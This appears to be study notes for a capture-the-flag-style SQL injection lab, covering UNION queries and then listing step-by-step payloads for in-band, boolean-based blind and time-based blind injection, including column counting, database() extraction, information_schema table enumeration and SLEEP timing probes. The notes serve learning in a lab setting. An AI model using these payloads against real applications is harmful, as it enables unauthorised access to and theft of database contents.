# SQL Injection

---

## TASK 3: SQL Union

The `UNION` statement combines the results of two or more `SELECT` statements to retrieve data from either single or multiple tables. Rules:

1. The `UNION` statement must retrieve the same number of columns in each `SELECT` statement.
2. The columns must be of a similar data type.
3. The column order must be the same.

Example:

```sql
SELECT name, address, city, postcode FROM customers
UNION
SELECT company AS name, address, city, postcode FROM suppliers;
```

---

## TASK 5: In-Band SQLi

In-Band SQL Injection uses the same communication channel to exploit the vulnerability and retrieve results.

### Steps:

1. Start with:

```sql
1 UNION SELECT 1
```

2. Increment columns until no error:

```sql
1 UNION SELECT 1,2
1 UNION SELECT 1,2,3
```

3. Replace column values with useful data:

```sql
0 UNION SELECT 1,2,database()
```

4. List tables:

```sql
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```

---

## TASK 7: Blind SQLi - Boolean Based

Boolean-based SQL Injection uses true/false responses to confirm if an injection payload is successful.

### Steps:

1. Find the number of columns:

```sql
admin123' UNION SELECT 1;--
admin123' UNION SELECT 1,2,3;--
```

2. Find the database name:

```sql
admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--
```

3. Find table names:

```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema='sqli_three';--
```

---

## TASK 8: Blind SQLi - Time Based

Time-based Blind SQL Injection introduces a delay using methods like `SLEEP(x)` to confirm successful queries.

### Steps:

1. Find the number of columns:

```sql
admin123' UNION SELECT SLEEP(5);--
admin123' UNION SELECT SLEEP(5),2;--
```

2. Enumerate database:

```sql
admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 'u%';--
```

---

## Appendix

---